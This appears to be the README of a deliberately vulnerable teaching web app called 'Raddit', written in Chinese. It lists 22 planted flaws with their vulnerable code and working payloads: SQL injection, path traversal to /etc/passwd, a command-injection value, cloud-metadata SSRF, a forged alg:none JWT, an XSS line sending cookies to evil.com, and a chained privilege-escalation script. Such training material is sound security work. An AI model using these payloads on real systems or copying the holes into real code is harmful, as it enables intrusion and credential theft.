# Raddit — 隐藏漏洞清单（教学用途）

> **警告**：本项目仅用于安全教学与漏洞研究，严禁在生产环境部署。

共 **22 个漏洞**，分布于 **15 条不同路径/端点**。

---

## 漏洞一览

| # | 类型 | 路径/位置 | 触发方式 |
|---|------|-----------|---------|
| 1 | SQL 注入 | `POST /api/auth/login` | username 字段 |
| 2 | SQL 注入 | `GET /api/posts/search?q=` | q 参数 |
| 3 | SQL 注入（ORDER BY）| `GET /api/posts?sort=&order=` | sort/order 参数 |
| 4 | 路径穿越 | `GET /api/files/download?name=` | name 参数 |
| 5 | 任意文件上传 | `POST /api/files/upload` | 无类型限制 |
| 6 | 命令注入 | `GET /api/tools/ping?host=` | host 参数 |
| 7 | SSRF | `GET /api/posts/preview?url=` | url 参数 |
| 8 | IDOR（越权删除）| `DELETE /api/posts/:id` | 无所有权校验 |
| 9 | 敏感数据暴露 | `GET /api/users/:id` | 返回密码哈希 |
| 10 | 质量分配（权限提升）| `PUT /api/users/profile` | role 字段 |
| 11 | JWT 弱密钥 | 所有认证端点 | 密钥为 "secret" |
| 12 | JWT alg:none | 所有认证端点 | 接受无签名 token |
| 13 | 信息泄露 | `GET /api/admin/debug` | 暴露配置/环境变量 |
| 14 | 硬编码凭据 | `config/config.go` | admin:admin123 |
| 15 | 日志密码泄露 | `POST /api/auth/login` | 明文密码写入日志 |
| 16 | 无速率限制 | `POST /api/auth/login` | 可暴力破解 |
| 17 | 开放重定向 | `POST /api/auth/login` | next 参数未验证 |
| 18 | 存储型 XSS | `POST /api/posts` + 帖子详情页 | 帖子内容 |
| 19 | 存储型 XSS | `POST /api/comments` + 评论区 | 评论内容 |
| 20 | 反射型 XSS | `GET /api/posts/search` + 首页 | 搜索词回显 |
| 21 | 存储型 XSS | `PUT /api/users/profile` + 个人页 | 个人简介字段 |
| 22 | CSRF 缺失 | 所有状态变更端点 | 无 token 校验 |

---

## 详细说明

### 1. SQL 注入 — 登录接口
**位置**：`backend/handlers/auth.go` → `Login()`
```
query := "SELECT ... WHERE username='" + req.Username + "'"
```
**利用**：用户名输入 `admin'--` 可跳过密码验证；`' OR '1'='1` 枚举所有用户。

---

### 2. SQL 注入 — 搜索接口
**位置**：`backend/handlers/posts.go` → `SearchPosts()`
```
"WHERE p.title LIKE '%" + keyword + "%'"
```
**利用**：`%' UNION SELECT id,username,password,email,role,username,0,0,datetime('now'),datetime('now') FROM users--`

---

### 3. SQL 注入 — 排序参数（ORDER BY）
**位置**：`backend/handlers/posts.go` → `ListPosts()`
```go
sortBy := c.DefaultQuery("sort", "p.created_at")  // 用户可控，直接拼入 ORDER BY
order  := c.DefaultQuery("order", "DESC")          // 同样用户可控
query = fmt.Sprintf("ORDER BY %s %s", sortBy, order)
```

**注意**：`sort=` 的注入直接展开为 `ORDER BY <expr>`，无任何前缀；`order=` 展开为 `ORDER BY p.created_at <suffix>`。

**利用 A — 通过 `sort=` 内联 CASE 盲注（真条件正常返回，假条件报错）**：
```
GET /api/posts?sort=CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN p.created_at ELSE RAISE(ABORT,'sqli') END&order=DESC
```
`COUNT(*)>0` 为真 → 正常返回帖子列表；改为 `1=2` → 返回 `{"error":"Could not fetch posts"}`。

**利用 B — 通过 `order=` 追加子查询（已验证可用）**：
```
GET /api/posts?sort=p.created_at&order=DESC,(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE RAISE(ABORT,'sqli') END)
```
生成：`ORDER BY p.created_at DESC,(SELECT CASE WHEN ...)` — 真条件静默通过，假条件触发 ABORT 错误。

> 为何 `sort=(SELECT CASE WHEN ... THEN p.created_at ...)` 失败：SQLite FROM-less 标量子查询中 `p.created_at` 为外层关联引用，在 `ORDER BY` 子查询上下文里无法解析，直接写 CASE 表达式（利用 A）或注入 `order=` 后缀（利用 B）可绕过此限制。

---

### 4. 路径穿越
**位置**：`backend/handlers/files.go` → `DownloadFile()`
```go
filePath := config.UploadDir + "/" + filename
// 未调用 filepath.Clean，也未校验 ".."
```
**利用**：`GET /api/files/download?name=../../etc/passwd`

---

### 5. 任意文件上传
**位置**：`backend/handlers/files.go` → `UploadFile()`
```go
filename := header.Filename  // 保留原始文件名，不校验扩展名
```
**利用**：上传 `.php`/`.sh`/`.exe` 文件，再通过路径穿越（漏洞4）执行。

---

### 6. 命令注入
**位置**：`backend/utils/utils.go` → `PingHost()`
```go
exec.Command("sh", "-c", "ping -c 3 "+host)
```
**利用**：`host=127.0.0.1; cat /etc/passwd` 或 `127.0.0.1 | id`

---

### 7. SSRF（服务端请求伪造）
**位置**：`backend/handlers/posts.go` → `PreviewURL()`
```go
client.Get(targetURL)  // targetURL 完全由用户控制
```
**利用**：`url=http://169.254.169.254/latest/meta-data/`（AWS 元数据）；内网扫描 `url=http://192.168.1.1`

---

### 8. IDOR — 越权删除帖子
**位置**：`backend/handlers/posts.go` → `DeletePost()`
```go
database.DB.Exec("DELETE FROM posts WHERE id=?", postID)
// 未检查 post.user_id == 当前用户 ID
```
**利用**：任意用户可删除他人帖子，只需知道帖子 ID。

---

### 9. 敏感数据暴露 — 密码哈希
**位置**：`backend/handlers/users.go` → `GetUser()`
```go
"SELECT id, username, email, password, ..."
// password 字段包含在 JSON 响应中
```
**利用**：`GET /api/users/1` 返回 bcrypt 哈希，可离线爆破。

---

### 10. 质量分配 — 权限提升
**位置**：`backend/handlers/users.go` → `UpdateProfile()`
```go
if req.Role != "" {
    database.DB.Exec("UPDATE users SET role=? WHERE id=?", req.Role, userID)
}
```
**利用**：普通用户发送 `{"role":"admin"}` 即可将自身提权至管理员。

---

### 11. JWT 弱密钥
**位置**：`backend/config/config.go`
```go
JWTSecret = getEnv("JWT_SECRET", "secret")
```
**利用**：使用 `jwt_tool` 或 hashcat 爆破，密钥为 `secret`，可伪造任意用户 token。

---

### 12. JWT Algorithm Confusion（alg:none）
**位置**：`backend/middleware/auth.go` → `parseToken()`
```go
if alg != "none" {
    // 验证签名
}
// alg=none 时跳过签名验证
```
**利用**：构造 header `{"alg":"none","typ":"JWT"}`，payload `{"user_id":1,"role":"admin","exp":9999999999}`，签名留空，服务端直接接受。

---

### 13. 信息泄露 — 调试端点
**位置**：`backend/handlers/admin.go` → `SystemInfo()`  
路径：`GET /api/admin/debug`（需 admin 角色，但结合漏洞10或12可绕过）
```go
"jwt_secret":     config.JWTSecret,
"admin_password": config.AdminPassword,
```
**利用**：获取 JWT 密钥、管理员密码、数据库路径、环境变量等。

---

### 14. 硬编码凭据
**位置**：`backend/config/config.go` + `backend/database/database.go`
```go
// config.go
AdminUsername = getEnv("ADMIN_USERNAME", "admin")
AdminPassword = getEnv("ADMIN_PASSWORD", "admin123")

// database.go — Initialize() 调用 seedAdmin()，首次启动时自动写入数据库
DB.Exec("INSERT INTO users (..., role) VALUES (?, ?, ?, 'admin')",
    config.AdminUsername, ..., string(hashed))
```
**利用**：首次启动（数据库文件不存在 / admin 用户未创建）时自动 seed 管理员账号，控制台打印 `Admin user created: admin / admin123`；直接使用 `admin` / `admin123` 登录即可获得全部管理权限。

> **注意**：若数据库文件已存在且 admin 账号已写入，`seedAdmin()` 会跳过创建（`COUNT(*) > 0` 提前 return）。验证时须删除旧数据库文件（默认路径见 `config.DBPath`）后重启服务。

---

### 15. 密码明文日志
**位置**：`backend/handlers/auth.go` → `Login()`
```go
log.Printf("[AUDIT] Failed login attempt - username: %s password: %s ip: %s",
    req.Username, req.Password, c.ClientIP())
```
**利用**：服务端日志（stdout、日志文件）中存有用户明文密码，获取日志即可得到密码。

---

### 16. 无速率限制
**位置**：`POST /api/auth/login`（无任何限速机制）  
**利用**：可无限次尝试密码，配合漏洞 15 的日志泄露，或直接暴力破解。

---

### 17. 开放重定向
**位置**：`backend/handlers/auth.go` → `Login()`，前端 `Login.jsx`
```go
// 服务端原样返回 next 参数
redirect_to: req.Next  // 未校验是否为站内路径
```
**利用**：钓鱼链接 `POST /api/auth/login` with `{"next":"https://evil.com"}`，登录成功后重定向至恶意站点。

---

### 18. 存储型 XSS — 帖子内容
**位置**：后端存储时不过滤（`handlers/posts.go`），前端 `PostCard.jsx` / `PostDetail.jsx`：
```jsx
dangerouslySetInnerHTML={{ __html: post.content }}
```
**利用**：发布含 `<script>fetch('https://evil.com?c='+document.cookie)</script>` 的帖子，所有访问者执行。

---

### 19. 存储型 XSS — 评论内容
**位置**：`Comment.jsx`
```jsx
dangerouslySetInnerHTML={{ __html: comment.content }}
```
**利用**：同上，通过评论植入 XSS payload。

---

### 20. 反射型 XSS — 搜索回显
**位置**：`Home.jsx`
```jsx
<span dangerouslySetInnerHTML={{ __html: searchQuery }} />
```
**利用**：构造链接 `/?q=<img src=x onerror=alert(1)>`，受害者点击后执行脚本。

---

### 21. 存储型 XSS — 个人简介
**位置**：`Profile.jsx`
```jsx
dangerouslySetInnerHTML={{ __html: profile.bio }}
```
**利用**：在个人简介中写入 XSS payload，访问该用户主页的人均受影响。

---

### 22. CSRF（跨站请求伪造）
**位置**：所有状态变更端点；`backend/handlers/auth.go` → `Login()` 设置 Cookie，`backend/main.go` → CORS 配置
```go
// auth.go — 登录时写入 HttpOnly Cookie，无显式 SameSite（浏览器默认 Lax）
c.SetCookie("session", token, 86400, "/", "", false, true)
// 服务端无任何 CSRF token 校验、Origin/Referer 验证

// main.go — CORS 白名单严格限制
AllowOrigins:     []string{"http://localhost:5173", "http://localhost:3000"},
AllowCredentials: true,
```

**认证双通道**：登录响应同时写入 Cookie 并在 body 返回 token；前端将 token 存入 `localStorage` 并通过 `Authorization: Bearer` 发送，同时 `credentials: 'include'` 带上 Cookie；中间件**优先读 Cookie**（`extractToken` 先检查 Cookie，再检查 Bearer）。

**利用约束**：
- CORS 白名单仅允许 `localhost:5173/3000`，攻击者页面的 `credentials: 'include'` fetch 请求会被 preflight 拦截，响应不可读
- Cookie 无显式 SameSite → 浏览器默认 Lax，跨站 POST 表单不携带 Cookie，进一步限制简单请求攻击
- Bearer token 存于 `localStorage`，跨域 JS 无法直接读取，不构成传统 CSRF 面

**真正可利用场景：结合 XSS（漏洞 #18–21）**
一旦在受害者浏览器内取得同源 JS 执行权（XSS），CSRF 保护天然失效，可直接读取 `localStorage` token 或携带 Cookie 发起任意状态变更请求：
```html
<!-- 嵌入恶意帖子/评论，结合 XSS payload -->
<script>
// 同源执行，CORS 不阻拦，Cookie/token 均可用
fetch('/api/users/profile', {
  method: 'PUT',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json',
             'Authorization': 'Bearer ' + localStorage.getItem('token') },
  body: JSON.stringify({ role: 'admin' })  // 结合漏洞10提权
})
</script>
```

> **结论**：单独的 CSRF 因 CORS 白名单 + SameSite Lax (implicit) 可利用性受限；与 XSS 组合后危害显著放大，是本项目漏洞链的关键节点。

---

## 漏洞路径分布统计

| 端点路径 | 漏洞数 | 漏洞编号 |
|---------|--------|---------|
| `POST /api/auth/login` | 4 | #1, #15, #16, #17 |
| `GET /api/posts` | 1 | #3 |
| `GET /api/posts/search` | 2 | #2, #20 |
| `GET /api/posts/preview` | 1 | #7 |
| `POST /api/posts` | 1 | #18 |
| `DELETE /api/posts/:id` | 1 | #8 |
| `POST /api/comments` | 1 | #19 |
| `GET /api/users/:id` | 1 | #9 |
| `PUT /api/users/profile` | 2 | #10, #21 |
| `POST /api/files/upload` | 1 | #5 |
| `GET /api/files/download` | 1 | #4 |
| `GET /api/tools/ping` | 1 | #6 |
| `GET /api/admin/debug` | 1 | #13 |
| 全部认证端点 | 2 | #11, #12 |
| 代码/配置层面 | 2 | #14, #22 |

**总计：22 个漏洞，跨 15 条路径**

---

## 启动项目

```bash
# 后端
cd backend && go run .

# 前端（另开终端）
cd frontend && npm install && npm run dev
```

访问：http://localhost:5173
